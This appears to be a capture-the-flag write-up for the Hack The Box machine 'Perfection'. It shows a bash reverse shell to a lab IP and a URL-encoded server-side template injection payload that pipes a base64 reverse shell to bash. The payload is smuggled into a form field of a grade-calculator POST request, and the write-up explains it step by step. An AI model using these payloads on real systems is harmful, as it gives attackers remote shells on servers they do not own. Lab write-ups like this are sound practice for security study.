---
description: https://app.hackthebox.com/machines/Perfection
---

# 🧗 Perfection

<figure><img src="../../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

After the enumeration we find a webpage where we can submit some data, let's try to input a reverse shell →

<figure><img src="../../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>

```
bash -i >& /dev/tcp/10.10.14.62/8888 0>&1
```

it did not work so after looking for a bit:&#x20;

I saw that the framework webrick was vulnerable to URL encoding&#x20;

So on cyberchef I encoded the reverse shell:

<figure><img src="../../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>

set up a listener with the good lhost and port ->

Submitting it in the form did not work, so i fired up burp

the payload needed to be encoded in base64 then url encoded and  looks like this:&#x20;

```
WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0Mk1pODNNemN6SURBK0pqRT0=                
```

and final payload:

```
a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC42Mi83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>1
```

so the request looks like:&#x20;

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.129.211.68
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Origin: http://10.129.211.68
DNT: 1
Connection: close
Referer: http://10.129.211.68/weighted-grade-calc
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

grade1=1&weight1=100&category2=N%2FA&grade2=1&weight2=0&category3=N%2FA&grade3=1&weight3=0&category4=N%2FA&grade4=1&weight4=0&category5=N%2FA&grade5=1&weight5=0&category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC42Mi83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>1
```

1. `%0A`: This represents a newline character (line feed). It is used to break the line and start a new line in the code.
2. `<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC42Mi83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>`: This part of the payload is URL-encoded. After decoding, it becomes `<%=system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Mi83MzczIDA+JjE=| base64 -d | bash");%>`. This code snippet uses the server-side scripting tag `<% %>` (commonly used in languages like PHP or ASP) to execute a system command.
3.  The system command being executed is `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Mi83MzczIDA+JjE=| base64 -d | bash`. Breaking it down further:

    * `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Mi83MzczIDA+JjE=`: This part echoes a base64-encoded string.
    * `| base64 -d`: This pipes the echoed string to the `base64` command with the `-d` option, which decodes the base64-encoded string.
    * `| bash`: Finally, the decoded string is piped to the `bash` shell for execution.

    <figure><img src="../../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>
